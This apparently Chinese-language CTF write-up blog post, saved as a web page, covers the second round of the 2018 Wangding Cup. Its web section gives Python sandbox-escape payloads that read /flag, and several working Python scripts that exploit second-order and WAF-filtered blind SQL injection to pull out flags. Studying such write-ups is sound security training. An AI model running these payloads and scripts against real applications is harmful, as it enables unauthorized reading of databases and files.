@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="学到了很重要的fuzz思想">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯第二场wp">
+<meta property="og:url" content="http://Merl1ng.com/2018/08/24/网鼎杯第二场wp/index.html">
+<meta property="og:site_name" content="Merl1ng's blog">
+<meta property="og:description" content="学到了很重要的fuzz思想">
+<meta property="og:updated_time" content="2018-09-02T13:28:12.775Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯第二场wp">
+<meta name="twitter:description" content="学到了很重要的fuzz思想">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://Merl1ng.com/2018/08/24/网鼎杯第二场wp/"/>
+
+
+
+
+
+  <title>网鼎杯第二场wp | Merl1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Merl1ng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/08/24/网鼎杯第二场wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Merl1ng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网鼎杯第二场wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-24T13:27:39+08:00">
+                2018-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>学到了很重要的fuzz思想<br><a id="more"></a></p>
+<p><a href="https://xz.aliyun.com/t/2619" target="_blank" rel="external">https://xz.aliyun.com/t/2619</a><br><a href="https://mochazz.github.io/2018/08/23/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">https://mochazz.github.io/2018/08/23/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/</a><br><a href="http://lu4n.com/wangdingbei-second-web-writeup/" target="_blank" rel="external">http://lu4n.com/wangdingbei-second-web-writeup/</a><br><a href="https://xz.aliyun.com/t/2614" target="_blank" rel="external">https://xz.aliyun.com/t/2614</a><br><a href="https://www.o2oxy.cn/1688.html" target="_blank" rel="external">https://www.o2oxy.cn/1688.html</a></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>python沙盒逃逸 最基础的payload就能打<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1+1,().__class__.__bases__[0].__subclasses__()[40](<span class="string">'/flag'</span>).read()</div><div class="line"></div><div class="line">1+1+int(([].__class__.__base__.__subclasses__()[40](‘/flag’,’r’).read()).encode(‘utf-8’),16) </div><div class="line"></div><div class="line">1+2+<span class="built_in">float</span>(str([].__class__.__mro__[-1].__subclasses__()[40](<span class="string">'/flag'</span>).read()))</div></pre></td></tr></table></figure></p>
+<h3 id="wafupload"><a href="#wafupload" class="headerlink" title="wafupload"></a>wafupload</h3><p>pwnhub 傻fufu的工作日原题 构造数组绕过</p>
+<p>更多上传getsehll 参考<br><a href="http://skysec.top/2018/08/16/Upload-labs&amp;Upload%20Bypass%20Summarize/" target="_blank" rel="external">http://skysec.top/2018/08/16/Upload-labs&amp;Upload%20Bypass%20Summarize/</a></p>
+<h3 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h3><p>首先fuzz看看过滤 (fuzz真滴超级重要)</p>
+<p>过滤了逗号比较烦人</p>
+<p>二次注入</p>
+<p>什么是二次注入呢  我的理解是 题目环境执行了两次sql的语句</p>
+<p>第一次把你的语句存入数据库 第二次从数据库中回显第一次的数据结果 </p>
+<p>比较常见的形式是一个注册页面一个登陆页面 注册页面可能会多填很多信息 但某个信息登陆时并不需要</p>
+<p>但是登陆后有显示  这说明后台在登录时也从数据库取了这个信息</p>
+<p>比如这次的题目 还有强网杯上的 当时是 age参数</p>
+<p>这题我们首先要考虑闭合’    ‘ 由于union被waf 采用+连接</p>
+<p>注册时 0’%2B(select hex(hex(database())))%2B’0</p>
+<p>现在我们逐一分析这个payload 0’ 和 ‘0很显然是闭合’’ 闭合前一个才能执行我们想自定的sql语句</p>
+<p>这样后面会多一个’所以再次用 ‘0闭合后面的</p>
+<p>这样在注册时便把两次hex后database的名字写进了数据库 这便是执行了第一次sql语句</p>
+<p>然后我们去登陆 执行了第二次sql语句 便把两次hex后database的名字</p>
+<p>最后我们解两次hex便可以拿到database</p>
+<p>为什么要两次hex呢 为了让想获取的信息完全变成数字形式 这样与0相加仍然是本身</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 存在bug的脚本</span></div><div class="line">import requests</div><div class="line">import re,binascii</div><div class="line">login_url = <span class="string">"http://aad6cdfbfad34a09b7f947a852b226c4758d9b48816d48e9.game.ichunqiu.com/login.php"</span></div><div class="line">register_url = <span class="string">"http://aad6cdfbfad34a09b7f947a852b226c4758d9b48816d48e9.game.ichunqiu.com/register.php"</span></div><div class="line"></div><div class="line">users_email = [<span class="string">"test0"</span> + str(i) + <span class="string">"@qq.com"</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(0,17)]</div><div class="line">def register(user_email,offset):</div><div class="line">    reg_datas = &#123;</div><div class="line">        <span class="string">"email"</span> : user_email,</div><div class="line">        <span class="string">"username"</span> : <span class="string">"0'+(select substr(hex(hex((select * from flag))) from "</span> + str(1+offset*10)+ <span class="string">" for 10))+'0"</span>,</div><div class="line">        <span class="string">"password"</span> : <span class="string">"test"</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment"># print(reg_datas['username'])</span></div><div class="line">    r = requests.post(url = register_url,data = reg_datas)</div><div class="line"></div><div class="line">def login(user_email):</div><div class="line">    login_datas = &#123;</div><div class="line">        <span class="string">"email"</span> : user_email,</div><div class="line">        <span class="string">"password"</span> : <span class="string">"test"</span></div><div class="line">    &#125;</div><div class="line">    r = requests.post(url = login_url,data = login_datas,allow_redirects=True)</div><div class="line">    pattern = <span class="string">'&lt;span class=\"user-name\"&gt;\s*(\d&#123;1,10&#125;)\s*&lt;'</span></div><div class="line">    <span class="built_in">return</span> re.findall(pattern,r.text)[0]</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    flag_double_hex = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> email,offset <span class="keyword">in</span> zip(users_email,range(0,len(users_email))):</div><div class="line">        register(email,offset)</div><div class="line">        <span class="built_in">test</span> = login(email)</div><div class="line">        <span class="built_in">print</span>(<span class="built_in">test</span>)</div><div class="line">        flag_double_hex += <span class="built_in">test</span></div><div class="line">        <span class="built_in">print</span>(<span class="string">"[-] "</span> + flag_double_hex,end=<span class="string">"\r"</span>,flush=True)</div><div class="line">    <span class="built_in">print</span>(<span class="string">"[+] "</span> + flag_double_hex.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>))</div></pre></td></tr></table></figure>
+<p>所以两次hex并不是唯一的方法 只要能保证变信息为数字就可以 比如</p>
+<p>0’+ascii(mid((select * from flag)from(“+str(i)+”)for(1)))+’0 </p>
+<p>这种形式也完全ok</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">import requests</div><div class="line">import time</div><div class="line"> </div><div class="line">email = <span class="string">"xasqxa@qq.com"</span></div><div class="line">cookies = &#123;</div><div class="line">	<span class="string">"PHPSESSID"</span>: <span class="string">"96mmrs6fdb9nqpb5qo15e9pj56"</span></div><div class="line">&#125;</div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50):</div><div class="line">	i += 20</div><div class="line">	data = &#123;</div><div class="line">		<span class="string">"email"</span>: email+str(i),</div><div class="line">		<span class="string">"username"</span>: <span class="string">"0'+ascii(mid((select * from flag)from("</span>+str(i)+<span class="string">")for(1)))+'0"</span>,</div><div class="line">		<span class="string">"password"</span>: <span class="string">"123"</span></div><div class="line">	&#125;</div><div class="line">	requests.post(<span class="string">"http://861f47bab70e4e9c8ba4f9e84d8b8bc66605bac1880344ad.game.ichunqiu.com/register.php"</span>, data=data, cookies=cookies)</div><div class="line">	o = requests.post(<span class="string">'http://861f47bab70e4e9c8ba4f9e84d8b8bc66605bac1880344ad.game.ichunqiu.com/login.php'</span>, data=data, cookies=cookies).text[837:850].split(<span class="string">" "</span>)[0]</div><div class="line">	flag += chr(int(o))</div><div class="line">	<span class="built_in">print</span> flag</div><div class="line"><span class="comment">#flag&#123;a198e723-0a11-4c88-baa8-c8b6b41269a1&#125;</span></div></pre></td></tr></table></figure>
+<p>那么空字符串行不行呢</p>
+<p>如果空字符串的话就是 ‘+select database()+’</p>
+<p>这你本地测一下就知道不行 ‘’+任何全都没用 拿不到database()的结果</p>
+<p>后来还看见一种更厉害的 不用转数字</p>
+<p>1’and((select substr((%s)from(%d)for(1))=’%s’))and’1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import requests as req</div><div class="line">import random</div><div class="line">import sys</div><div class="line"></div><div class="line">URL = <span class="string">'http://99836af07612423cb83b84745ccd56dcd11ede0687854475.game.ichunqiu.com'</span></div><div class="line"></div><div class="line"></div><div class="line">def login(email):</div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"email"</span>: email,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></div><div class="line">    &#125;</div><div class="line">    res = req.post(URL + <span class="string">'/login.php'</span>, data)</div><div class="line">    <span class="keyword">if</span> res.status_code == 200 and <span class="string">'1          &lt;/span&gt;'</span> <span class="keyword">in</span> res.content:</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="built_in">return</span> False</div><div class="line"></div><div class="line"></div><div class="line">def reg(u, e):</div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"username"</span>: u,</div><div class="line">        <span class="string">"email"</span>: e,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></div><div class="line">    &#125;</div><div class="line">    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=False)</div><div class="line">    <span class="keyword">if</span> res.status_code == 302:</div><div class="line">        <span class="built_in">return</span> login(e)</div><div class="line">    <span class="built_in">return</span> False</div><div class="line">table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></div><div class="line"></div><div class="line"></div><div class="line">def b(pl):</div><div class="line">    email = <span class="string">''</span>.join(random.sample(table, 8)) + <span class="string">'@qq.com'</span></div><div class="line">    <span class="built_in">return</span> reg(pl, email)</div><div class="line"></div><div class="line"></div><div class="line">def getLen(sql):</div><div class="line">    <span class="built_in">print</span>(<span class="string">"[+] Starting getLen..."</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1, 60):</div><div class="line">        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</div><div class="line">        sys.stdout.flush()</div><div class="line">        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</div><div class="line">            <span class="built_in">print</span>(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</div><div class="line">            <span class="built_in">return</span> i</div><div class="line">    <span class="built_in">return</span> 0</div><div class="line"></div><div class="line"></div><div class="line">def getData(sql=<span class="string">"version()"</span>):</div><div class="line">    _len = getLen(sql)</div><div class="line">    <span class="keyword">if</span> not _len:</div><div class="line">        <span class="built_in">print</span>(<span class="string">"[-] getLen 'Error'"</span>)</div><div class="line">        <span class="built_in">return</span> False</div><div class="line">    <span class="built_in">print</span>(<span class="string">"[+] Starting getData..."</span>)</div><div class="line">    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></div><div class="line">    res = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(1, _len + 1):</div><div class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</div><div class="line">            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</div><div class="line">            sys.stdout.flush()</div><div class="line">            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</div><div class="line">                sql, pos, ch)</div><div class="line">            <span class="keyword">if</span> b(pl):</div><div class="line">                res += ch</div><div class="line">                <span class="built_in">break</span></div><div class="line">    <span class="built_in">print</span>(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line"><span class="comment"># right(left(x,pos),1)</span></div><div class="line"><span class="comment"># mid(x,pos,1)</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'</span></div><div class="line">    <span class="comment"># pl = "1'and(%s)and'1" % pl</span></div><div class="line">    <span class="comment"># print(b(pl))</span></div><div class="line">    pl = <span class="string">'version()'</span></div><div class="line">    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></div><div class="line">    getData(pl)</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">① select * from table <span class="built_in">limit</span> 2,1;                </div><div class="line"></div><div class="line">//含义是跳过2条取出1条数据，<span class="built_in">limit</span>后面是从第2条开始读，读取1条信息，即读取第3条数据</div><div class="line"></div><div class="line"></div><div class="line">② select * from table <span class="built_in">limit</span> 2 offset 1;     </div><div class="line"></div><div class="line">//含义是从第1条（不包括）数据开始取出2条数据，<span class="built_in">limit</span>后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</div></pre></td></tr></table></figure>
+<h3 id="sqlweb"><a href="#sqlweb" class="headerlink" title="sqlweb"></a>sqlweb</h3><p>fuzz看waf</p>
+<p>登陆框 admin提示密码错误 其他用户名提示用户名错误 </p>
+<p>fuzz 密码 发现是 admin123</p>
+<p>登进去发现提示 只有 wuyanzu 用户才能拿到 flag 。至此，思路就很清晰了，flag 应该就是 wuyanzu 用户的密码，或者 wuyanzu 用户登陆后就能看到 flag 所以这题就是考察绕过 WAF 进行 SQL注入</p>
+<p>waf:/sleep|benchmark|=|like|regexp|and||%|substr|union|\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i  !!! (trust me,no one can bypass it)</p>
+<p>过滤了空格，可以用 /**/ 来绕过；过滤了 and ，可以用 &amp;&amp; 代替；过滤了 substr 、 ascii ，但是还可以用 mid 。而且SQL语句执行和不执行返回的长度是不一样的</p>
+<p>思路还蛮熟悉的 借助用户名的位置注出密码</p>
+<p><code>wuyanzu&#39;/**/&amp;&amp;/**/password&gt;%s#</code></p>
+<p>这个payload比较简便 不过不能区分大小写 好在这比赛的flag全是小写的 和n1ctf上的有点类似</p>
+<p><code>wuyanzu&#39;/**/&amp;&amp;/**/mid(passwd/**/from/**/&quot; + str(i) +&quot;/**/for/**/1)/**/in/**/(&#39;&quot; + char + &quot;&#39;)/**/limit/**/1#</code></p>
+<p>这个看起来比较正常一点</p>
+<p>limit 1 (后面只有一个参数)是从1开始</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from Customer LIMIT 10;--检索前10行数据，显示1-10条数据</div><div class="line">select * from Customer LIMIT 1,10;--检索从第2行开始，累加10条id记录，共显示id为2....11</div></pre></td></tr></table></figure>
+<p>from for 之前用的不多<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database();</div><div class="line">+------------+</div><div class="line">| database() |</div><div class="line">+------------+</div><div class="line">| typecho    |</div><div class="line">+------------+</div><div class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select substr(database() from 1 <span class="keyword">for</span> 2);</div><div class="line">+---------------------------------+</div><div class="line">| substr(database() from 1 <span class="keyword">for</span> 2) |</div><div class="line">+---------------------------------+</div><div class="line">| ty                              |</div><div class="line">+---------------------------------+</div><div class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select substr(database() from 2 <span class="keyword">for</span> 3);</div><div class="line">+---------------------------------+</div><div class="line">| substr(database() from 2 <span class="keyword">for</span> 3) |</div><div class="line">+---------------------------------+</div><div class="line">| ype                             |</div><div class="line">+---------------------------------+</div><div class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div><div class="line"><span class="comment">#说明前面一个数字是从第几个开始读取，最后的一个数字是读取的长度。</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">flag = <span class="string">''</span></div><div class="line">chars = <span class="string">"&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">url = <span class="string">"http://902f59bfbb134985aeef8fb606e07c77373dedd3ef0e4bca.game.ichunqiu.com//sql.php"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</div><div class="line">        datas = &#123;</div><div class="line">            <span class="string">"uname"</span> : <span class="string">"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/"</span> + str(i) +<span class="string">"/**/for/**/1)/**/in/**/('"</span> + char + <span class="string">"')/**/limit/**/1#"</span>,</div><div class="line">            <span class="string">"passwd"</span> : <span class="string">"rte"</span>,</div><div class="line">            <span class="string">"submit"</span> : <span class="string">"login"</span></div><div class="line">        &#125;</div><div class="line">        r = requests.post(url = url, data = datas)</div><div class="line">        <span class="keyword">if</span> len(r.text) == 75:</div><div class="line">            flag += char</div><div class="line">            <span class="built_in">print</span>(<span class="string">"[-] "</span> + flag,end=<span class="string">"\r"</span>,flush=True)</div><div class="line">            <span class="keyword">if</span> char == <span class="string">'&#125;'</span>:</div><div class="line">                <span class="built_in">print</span>(<span class="string">"[+] "</span> + flag)</div><div class="line">                <span class="built_in">exit</span>()</div></pre></td></tr></table></figure>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>lsb 直接zsteg最里面的图片</p>
+<h3 id="虚幻"><a href="#虚幻" class="headerlink" title="虚幻"></a>虚幻</h3><p>汉信码<br>第一次见是在 <a href="https://xz.aliyun.com/t/1625" target="_blank" rel="external">https://xz.aliyun.com/t/1625</a></p>
+<p>拼图的时候按提取的顺序 我最开始还以为要全试一遍orz</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p><a href="https://m.sohu.com/a/249661061_557054/?pvid=000115_3w_a" target="_blank" rel="external">https://m.sohu.com/a/249661061_557054/?pvid=000115_3w_a</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/28/巅峰极客第二场wp/" rel="next" title="巅峰极客第二场wp">
+                <i class="fa fa-chevron-left"></i> 巅峰极客第二场wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/20/网鼎杯wp/" rel="prev" title="网鼎杯wp">
+                网鼎杯wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Merl1ng" />
+          <p class="site-author-name" itemprop="name">Merl1ng</p>
+           
+              <p class="site-description motion-element" itemprop="description">Love life , love gakki !</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">71</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
